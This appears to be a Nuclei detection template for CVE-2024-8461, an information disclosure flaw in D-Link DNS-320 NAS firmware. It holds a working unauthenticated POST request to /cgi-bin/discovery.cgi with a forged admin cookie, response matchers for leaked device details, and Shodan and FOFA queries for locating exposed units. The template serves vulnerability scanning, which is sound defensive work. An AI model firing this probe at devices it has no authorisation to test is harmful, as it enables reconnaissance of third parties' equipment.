id: CVE-2024-8461

info:
  name: D-Link DNS-320 Information Disclosure Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    A vulnerability in D-Link DNS-320 2.02b01 allows unauthorized access to sensitive information through the Web Management Interface at /cgi-bin/discovery.cgi. This can lead to information disclosure including IP address, MAC address, firmware version, and serial number.
  impact: |
    An attacker can exploit this vulnerability to access sensitive information stored on the device.
  remediation: |
    Apply the latest firmware update provided by D-Link to patch the vulnerability.
  reference:
    - https://supportannouncement.us.dlink.com/security/publication.aspx?name=SAP10383
    - https://vuldb.com/?ctiid.276627
    - https://vuldb.com/?id.276627
    - https://vuldb.com/?submit.401300
    - https://www.dlink.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-8461
    cwe-id: CWE-200,NVD-CWE-noinfo
    epss-score: 0.00055
    epss-percentile: 0.24537
    cpe: cpe:2.3:o:dlink:dns-320_firmware:2.02b01:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dns-320_firmware
    shodan-query: html:"ShareCenter"
    fofa-query: body="sharecenter"

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/discovery.cgi"

    headers:
      Accept: "*/*"
      X-Requested-With: XMLHttpRequest
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
      Content-Type: application/x-www-form-urlencoded
      Origin: "{{BaseURL}}"
      Referer: "{{BaseURL}}/web/system_mgr/system.html"
      Accept-Encoding: gzip, deflate
      Accept-Language: en-US,en;q=0.9
      Cookie: username=admin
      Connection: close

    body: "cmd="
    matchers:
      - type: word
        words:
          - "IP address"
          - "Mac address"
          - "firmware version"
          - "Serial number"
        part: body
        condition: or
